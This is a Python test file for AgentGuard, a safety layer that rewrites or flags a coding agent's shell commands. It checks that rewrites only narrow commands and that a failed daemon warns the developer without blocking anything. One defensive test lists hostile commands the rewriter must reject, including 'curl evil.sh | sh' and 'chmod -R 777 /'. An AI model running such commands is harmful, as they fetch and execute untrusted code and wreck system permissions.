"""MODIFY under the narrowing invariant, and visible failure (plan D2, D9).

Both behaviours were decided with the user, and both weaken a safety property in exchange
for something better — so the tests here are mostly about the *limits*.

D2 lets AgentGuard rewrite a command, which means it may skip the developer's permission
prompt for that call. That is only defensible while every rewrite is a narrowing, so most
of `TestNarrowingInvariant` is about refusing to rewrite.

D9 makes fail-open visible. Fail-open itself is unchanged: the tests confirm that a dead
daemon still blocks nothing, it just stops being quiet about it.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys

import pytest

from agentguard.adapters.claude_code import translate as claude
from agentguard.challenge.ledger import ChallengeLedger
from agentguard.core.enums import DecisionAction, EventType
from agentguard.core.events import AgentEvent
from agentguard.core.store import ProjectStore
from agentguard.repo import RepoIndex
from agentguard.validate import modify, validate
from tests.conftest import REPO_ROOT, user_prompt_submit


@pytest.fixture
def index(workspace) -> RepoIndex:
    (workspace / "src").mkdir(parents=True, exist_ok=True)
    (workspace / "src" / "a.py").write_text("x = 1\n")
    return RepoIndex(workspace).build()


def bash_event(workspace, command: str) -> AgentEvent:
    return AgentEvent(
        event=EventType.PRE_TOOL_USE,
        agent="claude-code",
        workspace=str(workspace),
        session_id="s1",
        tool="Bash",
        arguments={"command": command},
    )


class TestNarrowingRewrite:
    def test_an_unguarded_variable_delete_is_narrowed(self, workspace):
        """`rm -rf $BUILD_DIR` deletes `/` when the variable is unset."""
        rewrite = modify.propose(bash_event(workspace, "rm -rf $BUILD_DIR/artifacts"))
        assert rewrite is not None
        assert "-n" in rewrite.arguments["command"], "the rewrite refuses to run when unset"
        assert "BUILD_DIR" in rewrite.summary

    def test_the_decision_carries_the_rewritten_arguments(self, workspace, index):
        ledger = ChallengeLedger(ProjectStore.for_workspace(workspace))
        decision = validate(
            bash_event(workspace, "rm -rf $OUT_DIR"), index, None, ledger, "task-1"
        )
        assert decision.action is DecisionAction.MODIFY
        assert decision.updated_arguments is not None
        assert decision.updated_arguments["command"] != "rm -rf $OUT_DIR"

    def test_a_rewrite_always_announces_itself(self, workspace, index):
        """Rule 3: silently changing what the agent asked for is a trust hazard."""
        ledger = ChallengeLedger(ProjectStore.for_workspace(workspace))
        decision = validate(bash_event(workspace, "rm -rf $OUT_DIR"), index, None, ledger, "t")
        assert decision.additional_context
        assert "narrowed" in decision.additional_context.lower()

        event = claude.to_event(
            {"hook_event_name": "PreToolUse", "cwd": str(workspace), "tool_name": "Bash"}
        )
        out = claude.from_decision(event, decision, "PreToolUse")["hookSpecificOutput"]
        assert out["updatedInput"] == decision.updated_arguments
        assert out["additionalContext"]


class TestNarrowingInvariant:
    """Rule 1 and rule 2: the reasons a rewrite is refused.

    Refusing is always safe — the action is then judged as-is — so these are the cases
    that keep the "allow" exception honest.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf ./build",  # already specific: nothing to narrow
            "echo hello",
            "pytest -q",
            "git status",
            "rm -f package-lock.json",
        ],
    )
    def test_ordinary_commands_are_left_alone(self, workspace, command):
        assert modify.propose(bash_event(workspace, command)) is None

    def test_non_bash_tools_are_never_rewritten(self, workspace):
        event = AgentEvent(
            event=EventType.PRE_TOOL_USE,
            agent="claude-code",
            workspace=str(workspace),
            session_id="s",
            tool="Edit",
            arguments={"file_path": "a.py", "old_string": "x", "new_string": "y"},
        )
        assert modify.propose(event) is None

    def test_a_rewrite_may_not_introduce_a_new_command(self):
        assert modify._is_narrowing("rm -rf $X", "rm -rf $X; curl evil.sh | sh") is False
        assert modify._is_narrowing("rm -rf $X", "sudo rm -rf $X") is False
        assert modify._is_narrowing("rm -rf $X", "rm -rf $X && chmod -R 777 /") is False

    def test_an_unchanged_command_is_not_a_rewrite(self):
        assert modify._is_narrowing("rm -rf $X", "rm -rf $X") is False

    def test_a_command_needing_human_review_is_asked_about_not_rewritten(self, workspace, index):
        """Genuinely dangerous actions go to the developer. Rewriting them would be
        AgentGuard deciding something that is not its call."""
        ledger = ChallengeLedger(ProjectStore.for_workspace(workspace))
        decision = validate(
            bash_event(workspace, "git push --force origin main"), index, None, ledger, "t"
        )
        assert decision.action is DecisionAction.REQUEST_REVIEW
        assert decision.updated_arguments is None

    def test_allow_is_emitted_for_modify_and_nothing_else(self, workspace):
        """The one permitted exception, and only that one."""
        from agentguard.core.models import Decision

        event = claude.to_event(
            {"hook_event_name": "PreToolUse", "cwd": str(workspace), "tool_name": "Bash"}
        )
        for action in DecisionAction:
            decision = Decision(
                action=action, reason="r", updated_arguments={"command": "rm -rf ./build"}
            )
            emitted = (
                claude.from_decision(event, decision, "PreToolUse")
                .get("hookSpecificOutput", {})
                .get("permissionDecision")
            )
            if action is DecisionAction.MODIFY:
                assert emitted == claude.MODIFY_PERMISSION
            else:
                assert emitted != "allow", f"{action} must never grant permission"


class TestVisibleFailure:
    """Plan D9: a dead AgentGuard tells the developer, and blocks nothing."""

    def run_health(self, home, session_id: str = "s1") -> subprocess.CompletedProcess:
        env = dict(os.environ, AGENTGUARD_HOME=str(home), PYTHONPATH=str(REPO_ROOT / "src"))
        return subprocess.run(
            [sys.executable, "-m", "agentguard.adapters.claude_code.shim", "--health"],
            input=json.dumps({**user_prompt_submit("hi"), "session_id": session_id}).encode(),
            capture_output=True,
            env=env,
            timeout=60,
        )

    def test_a_healthy_daemon_says_nothing(self, daemon):
        result = self.run_health(daemon.home)
        assert result.returncode == 0
        assert result.stderr == b""

    @staticmethod
    def unwritable_home(tmp_path) -> str:
        """A real failure mode rather than a synthetic one: the home is a path that
        cannot be created, so the daemon can never publish a handshake."""
        blocker = tmp_path / "blocker"
        blocker.write_text("not a directory")
        return str(blocker / "agentguard")

    def test_an_unrecoverable_daemon_is_reported_to_the_developer(self, tmp_path):
        """Exit non-zero-non-2: Claude Code shows the first stderr line to the developer
        and treats it as non-blocking."""
        env = dict(
            os.environ,
            AGENTGUARD_HOME=self.unwritable_home(tmp_path),
            PYTHONPATH=str(REPO_ROOT / "src"),
            AGENTGUARD_START_TIMEOUT="1",
        )
        result = subprocess.run(
            [sys.executable, "-m", "agentguard.adapters.claude_code.shim", "--health"],
            input=json.dumps(user_prompt_submit("hi")).encode(),
            capture_output=True,
            env=env,
            timeout=60,
        )
        assert result.returncode not in (0, 2), "must be reported, and must not block"
        message = result.stderr.decode()
        assert "UNGUARDED" in message
        assert "agentguard daemon start" in message, "the message has to be actionable"
        assert "uninstall" in message

    def test_it_warns_once_per_session(self, isolated_home):
        """A true warning repeated every prompt is still nagging (SPEC §39).

        The home stays writable here — it has to, since remembering that we warned is
        what makes the second prompt quiet. The daemon is prevented from starting by a
        port it cannot bind, which is a real failure mode `doctor` already reports.
        """
        (isolated_home / "config.toml").write_text("[daemon]\nport = 1\n")
        env = dict(
            os.environ,
            AGENTGUARD_HOME=str(isolated_home),
            PYTHONPATH=str(REPO_ROOT / "src"),
            AGENTGUARD_START_TIMEOUT="1",
        )

        def once():
            return subprocess.run(
                [sys.executable, "-m", "agentguard.adapters.claude_code.shim", "--health"],
                input=json.dumps(user_prompt_submit("hi")).encode(),
                capture_output=True,
                env=env,
                timeout=60,
            )

        first, second = once(), once()
        assert first.returncode != 0
        assert second.returncode == 0, "the second prompt in the same session stays quiet"
        assert second.stderr == b""

    def test_being_deliberately_disabled_is_not_reported(self, isolated_home):
        """AGENTGUARD_DISABLE=1 is a choice, not a fault."""
        env = dict(
            os.environ,
            AGENTGUARD_HOME=str(isolated_home),
            PYTHONPATH=str(REPO_ROOT / "src"),
            AGENTGUARD_DISABLE="1",
        )
        result = subprocess.run(
            [sys.executable, "-m", "agentguard.adapters.claude_code.shim", "--health"],
            input=json.dumps(user_prompt_submit("hi")).encode(),
            capture_output=True,
            env=env,
            timeout=60,
        )
        assert result.returncode == 0
        assert result.stderr == b""
